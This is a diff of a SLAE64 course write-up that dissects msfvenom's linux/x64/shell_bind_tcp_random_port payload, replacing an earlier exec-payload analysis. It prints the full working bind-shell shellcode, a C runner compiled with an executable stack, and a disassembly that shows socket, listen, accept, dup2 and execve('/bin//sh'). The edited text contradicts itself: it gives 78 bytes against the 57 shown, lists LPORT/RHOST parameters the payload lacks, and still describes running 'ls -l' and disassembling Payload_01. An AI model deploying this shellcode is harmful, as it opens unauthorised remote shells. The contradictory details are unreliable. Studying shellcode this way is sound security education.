@@ -1,4 +1,4 @@
-## Assignment #5.1: Shellcode `linux/x64/exec` Dissection
+## Assignment #5.1: Shellcode `l` Dissection
 ---
 ---
 ### Introduction
@@ -7,63 +7,62 @@ The first `msfvenom` shellcode that is going to be dissected in functionality is
 
 Let's see it's options:
 ```bash
-SLAE64>  msfvenom -p linux/x64/exec --list-options
-Options for payload/linux/x64/exec:
+SLAE64>  msfvenom -p linux/x64/shell_bind_tcp_random_port --list-options
+Options for payload/linux/x64/shell_bind_tcp_random_port:
 =========================
 
-       Name: Linux Execute Command
-     Module: payload/linux/x64/exec
+
+       Name: Linux Command Shell, Bind TCP Random Port Inline
+     Module: payload/linux/x64/shell_bind_tcp_random_port
    Platform: Linux
        Arch: x64
 Needs Admin: No
- Total size: 40
+ Total size: 57
        Rank: Normal
 
 Provided by:
-    ricky
-
-Basic options:
-Name  Current Setting  Required  Description
-----  ---------------  --------  -----------
-CMD                    yes       The command string to execute
+    Geyslan G. Bem <geyslan@gmail.com>
 
 Description:
-  Execute an arbitrary command
+  Listen for a connection in a random port and spawn a command shell. 
+  Use nmap to discover the open port: 'nmap -sS target -p-'.
 ```
-The payload is only 40 bytes and it requires a parameter in the `CMD` option, that's the command to execute. 
+
+The payload is only 78 bytes and it requires the following parameters:
+- `LPORT`: The port to listen for the incoming connection
+- `RHOST`: The target address
 
 ### Creating the Shellcode
 ---
 Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
 ```c
-SLAE64> msfvenom -p linux/x64/exec CMD="/bin/ls -l" -f c
+SLAE64> msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
-Payload size: 50 bytes
-Final size of c file: 236 bytes
+Payload size: 57 bytes
+Final size of c file: 264 bytes
 unsigned char buf[] = 
-"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
-"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0b\x00"
-"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x6c\x00\x56\x57"
-"\x48\x89\xe6\x0f\x05";
+"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
+"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
+"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
+"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
 SLAE64> 
-
 ```
-The generated payload size is 50 bytes, it increased it's size. This increase from 40 bytes is because the 10 bytes of `/bin/ls -l` string. Interesting.
+The generated payload size, this time did not change in size.
 
 ### Run Shellcode. The C Template
 ---
-To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_01.c`. The shellcode is placed in the `code[]` string:
+To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_02.c`. The shellcode is placed in the `code[]` string:
 ```c
 #include <stdio.h>
 #include <string.h>
 
 unsigned char code[]= \
-"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
-"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0b\x00"
-"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x6c\x00\x56\x57"
-"\x48\x89\xe6\x0f\x05";
+"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
+"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
+"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
+"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
 
 void main()
 {
@@ -74,47 +73,62 @@ void main()
 ```
 Now it can be compiled:
 ```bash
-gcc -fno-stack-protector -z execstack Payload_01.c -o Payload_01
+gcc -fno-stack-protector -z execstack Payload_02.c -o Payload_02
 ```
 When it's run, it shows the files of the directory:
 
-<img src="https://galminyana.github.io/img/A051_Shellcode_Run.png" width="75%" height="75%">
+<img src="https://galminyana.github.io/img/A052_Shellcode_Run.png" width="75%" height="75%">
 
 ### `objdump`: First Approach
 ---
-Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the shellcode:
+Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:
 
 ```asm
 SLAE64> objdump -M intel -D Payload_01
-
 **_REMOVED_**
-
 0000000000004060 <code>:
-    4060:	6a 3b                	push   0x3b
-    4062:	58                   	pop    rax
-    4063:	99                   	cdq    
-    4064:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
-    406b:	73 68 00 
-    406e:	53                   	push   rbx
-    406f:	48 89 e7             	mov    rdi,rsp
-    4072:	68 2d 63 00 00       	push   0x632d
-    4077:	48 89 e6             	mov    rsi,rsp
-    407a:	52                   	push   rdx
-    407b:	e8 0b 00 00 00       	call   408b <code+0x2b>
-    4080:	2f                   	(bad)  
-    4081:	62                   	(bad)  
-    4082:	69 6e 2f 6c 73 20 2d 	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
-    4089:	6c                   	ins    BYTE PTR es:[rdi],dx
-    408a:	00 56 57             	add    BYTE PTR [rsi+0x57],dl
-    408d:	48 89 e6             	mov    rsi,rsp
-    4090:	0f 05                	syscall 
+    4060:	48 31 f6             	xor    rsi,rsi
+    4063:	48 f7 e6             	mul    rsi
+    4066:	ff c6                	inc    esi
+    4068:	6a 02                	push   0x2
+    406a:	5f                   	pop    rdi
+    406b:	b0 29                	mov    al,0x29
+    406d:	0f 05                	syscall 
+    406f:	52                   	push   rdx
+    4070:	5e                   	pop    rsi
+    4071:	50                   	push   rax
+    4072:	5f                   	pop    rdi
+    4073:	b0 32                	mov    al,0x32
+    4075:	0f 05                	syscall 
+    4077:	b0 2b                	mov    al,0x2b
+    4079:	0f 05                	syscall 
+    407b:	57                   	push   rdi
+    407c:	5e                   	pop    rsi
+    407d:	48 97                	xchg   rdi,rax
+    407f:	ff ce                	dec    esi
+    4081:	b0 21                	mov    al,0x21
+    4083:	0f 05                	syscall 
+    4085:	75 f8                	jne    407f <code+0x1f>
+    4087:	52                   	push   rdx
+    4088:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
+    408f:	2f 73 68 
+    4092:	57                   	push   rdi
+    4093:	54                   	push   rsp
+    4094:	5f                   	pop    rdi
+    4095:	b0 3b                	mov    al,0x3b
+    4097:	0f 05                	syscall 
 	...
-
 **_REMOVED_**
-
 SLAE64> 
 ```
-Interesting that `objdump` detects some instructions as `(bad)`. Will have to check it.
+Per the disassembled code, a total of 5 syscalls been used. Let's see which ones are for the values of RAX before `syscall` instruction:
+- `sys_socket` : Value 0x29
+- `sys_listen` : Value 0x32
+- `sys_accept` : Value 0x2b
+- `sys_??????` : Value 0x21
+- `sys_execve` : Value 0x3b
+
+
 
 ### The Fun: GDB Analysis
 ---
